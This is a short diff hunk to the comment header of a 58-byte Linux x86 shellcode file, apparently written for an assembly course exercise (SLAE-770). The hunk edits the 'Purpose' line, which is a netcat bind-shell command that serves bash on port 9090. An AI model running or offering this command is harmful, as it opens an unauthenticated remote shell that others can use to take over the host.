@@ -2,7 +2,7 @@
 ; Linux x86
 ; Author:  thryb
 ; Date:    13-07-16
-; Purpose: /bin/nc -lp 9090 -ev/bin/bash
+; Purpose: /bin/nc -lp 9090 -le/bin/bash
 ; Size:    58 bytes
 ; ID:      SLAE-770 
 ;
